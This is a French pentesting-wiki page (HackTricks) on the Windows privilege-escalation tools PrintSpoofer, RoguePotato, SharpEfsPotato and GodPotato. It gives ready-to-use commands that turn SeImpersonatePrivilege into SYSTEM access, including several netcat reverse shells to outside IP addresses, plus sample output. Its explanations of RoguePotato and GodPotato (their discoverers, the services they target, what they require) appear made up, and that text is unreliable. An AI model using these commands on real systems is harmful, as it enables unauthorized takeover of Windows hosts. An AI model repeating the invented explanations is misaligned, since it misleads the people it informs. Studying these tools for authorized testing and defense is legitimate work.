# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato ne fonctionne pas** sur Windows Server 2019 et Windows 10 build 1809 et plus. Cependant, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) peuvent être utilisés pour **exploiter les mêmes privilèges et obtenir un accès de niveau `NT AUTHORITY\SYSTEM`**. Ce [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) approfondit l'outil `PrintSpoofer`, qui peut être utilisé pour abuser des privilèges d'usurpation sur les hôtes Windows 10 et Server 2019 où JuicyPotato ne fonctionne plus.
{% endhint %}

## Démo rapide

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL

```
### RoguePotato

RoguePotato est une technique d'escalade de privilèges locale qui exploite une vulnérabilité dans le service "DcomLaunch" pour obtenir un accès SYSTEM. Cette technique a été découverte par @zerosum0x0 et a été rendue publique en 2020.

La technique consiste à créer un objet COM (Component Object Model) personnalisé qui pointe vers un objet système existant. Ensuite, l'objet COM est enregistré en tant que service DCOM (Distributed Component Object Model) et le service est démarré. Lorsque le service est démarré, l'objet COM est activé et exécute le code malveillant avec les privilèges SYSTEM.

RoguePotato peut être utilisé pour obtenir un accès SYSTEM sur des systèmes Windows 10 et Windows Server 2016/2019. Cependant, il nécessite des privilèges d'administrateur local pour être exécuté.

La technique a été nommée RoguePotato en référence à une autre technique d'escalade de privilèges appelée Potato qui exploite une vulnérabilité dans le service "Windows Management Instrumentation" (WMI).
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
### SharpEfsPotato

SharpEfsPotato est une technique d'escalade de privilèges locale qui exploite une vulnérabilité dans le service "EFSRPC" pour obtenir un accès SYSTEM. Cette technique est similaire à RoguePotato et PrintSpoofer, mais elle utilise une méthode différente pour atteindre le même objectif.
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

### Description

GodPotato est une technique de privilège d'escalade locale qui exploite une vulnérabilité dans le service "Task Scheduler" de Windows. Cette technique a été découverte par le chercheur en sécurité @decoder_it et est similaire à la technique RoguePotato.

### Comment ça marche

GodPotato exploite une vulnérabilité dans le service "Task Scheduler" de Windows pour exécuter du code arbitraire avec des privilèges SYSTEM. Pour ce faire, GodPotato utilise une technique appelée "DLL hijacking" pour charger une DLL malveillante dans le contexte du service "Task Scheduler". Cette DLL malveillante contient du code qui exécute la technique RoguePotato pour obtenir des privilèges SYSTEM.

### Comment se protéger

La meilleure façon de se protéger contre GodPotato est de s'assurer que les correctifs de sécurité pour Windows sont à jour. Il est également recommandé de limiter l'accès aux comptes d'administrateur et de surveiller les activités suspectes sur le réseau.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
